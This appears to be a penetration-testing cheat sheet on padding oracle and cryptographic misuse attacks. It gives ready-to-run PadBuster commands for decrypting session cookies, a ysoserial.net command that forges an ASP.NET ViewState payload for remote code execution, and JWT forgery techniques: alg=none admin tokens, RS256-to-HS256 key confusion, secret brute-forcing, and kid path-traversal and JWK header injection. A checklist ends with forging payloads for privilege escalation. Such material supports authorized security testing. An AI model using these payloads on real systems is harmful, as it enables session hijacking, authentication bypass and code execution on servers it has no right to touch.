# Padding Oracle & Crypto Misuse

## Padding Oracle Attack (CBC Mode)

### Detection
```
1. Find encrypted cookie / token / parameter (Base64, hex, length multiple of 8 or 16)
2. Flip 1 byte in ciphertext → send → observe response
3. If 500 error / different error / timing difference = padding oracle
```

### PadBuster (Automated)
```bash
# PadBuster.pl
perl padBuster.pl https://target.com/page.php "encrypted_cookie_value" 16 -cookies "session=encrypted_cookie_value" -encoding 0

# python-paddingoracle
python3 -m paddingoracle --url https://target.com --cookie session=encrypted_value --block-size 16
```

### Manual Testing
```python
import requests

def test_padding_oracle(ciphertext_b64):
    # Decode, flip last byte of second-to-last block, re-encode
    # Send → if error differs from valid padding error = oracle
    pass
```

## ViewState (ASP.NET)

### Detection
```
__VIEWSTATE=/wEPDwUKMT... (Base64, starts with /wE)
__VIEWSTATEGENERATOR=CA0B0334
```

### ViewState Exploitation
```bash
# 1. Check if ViewStateMAC disabled (ViewStateUserKey only)
# 2. If MAC enabled but validation key known/weak → forge ViewState
# 3. ysoserial.net ViewState plugin
ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "cmd /c calc" --validationalg="SHA1" --validationkey="..." --generator="CA0B0334"
```

### ViewState → RCE Chain
```
1. Padding oracle on ViewState → decrypt → see internal structure
2. If validation key leaked (via /actuator/env, error disclosure, git history) → forge malicious ViewState
3. ysoserial.net gadget → RCE on deserialization
4. Common gadgets: TypeConfuseDelegate, TextFormattingRunProperties, WindowsIdentity
```

## JWT Crypto Misuse

### alg=none
```python
header = {"alg":"none","typ":"JWT"}
payload = {"sub":"admin","role":"admin"}
token = base64(header) + "." + base64(payload) + "."
```

### RS256 → HS256 Confusion
```python
# Get public key from /.well-known/jwks.json
# Sign with public key as HMAC secret
token = jwt.encode({"sub":"admin"}, public_key, algorithm="HS256")
```

### Weak Secret Bruteforce
```bash
hashcat -a 0 -m 16500 jwt.txt ~/wordlists/rockyou.txt
```

### kid Header Injection
```json
{"kid": "../../../../dev/null", "alg": "HS256"}
# If server uses kid to load key file → /dev/null = empty key = empty HMAC secret
```

### JWK Header Injection
```json
{"jwk": {"kty":"oct","k":"base64url_encoded_key"}, "alg":"HS256"}
# If server accepts JWK from header → attacker controls signing key
```

## Encrypted Session Cookies (Generic)

### Detection Signals
| Signal | Indicates |
|--------|-----------|
| Length multiple of 8 | DES/3DES/Blowfish (64-bit block) |
| Length multiple of 16 | AES (128-bit block) |
| Base64 decodes to high entropy | Encrypted (not encoded) |
| 1-byte flip → 500 / different error | Padding oracle |
| Same plaintext → different ciphertext each time | IV randomized (good) |
| Same plaintext → same ciphertext | ECB mode / fixed IV (bad) |

### ECB Mode Detection
```python
# Encrypt same plaintext twice
# If ciphertext blocks repeat → ECB mode → block rearrangement attack
```

## Testing Checklist
```
[ ] Find all encrypted cookies/tokens/params (Base64, hex, length 16/32/48+)
[ ] Test 1-byte flip → observe error difference (padding oracle)
[ ] If ASP.NET: test ViewState padding oracle + ViewStateMAC bypass
[ ] Test JWT: alg=none, RS256→HS256, weak secret, kid path traversal, JWK injection
[ ] Test for ECB mode (repeat plaintext → repeat ciphertext blocks)
[ ] If oracle found: use PadBuster / python-paddingoracle to decrypt
[ ] Decrypted data → look for: user_id, role, permissions, session data
[ ] Forge encrypted payload with modified plaintext → privilege escalation
```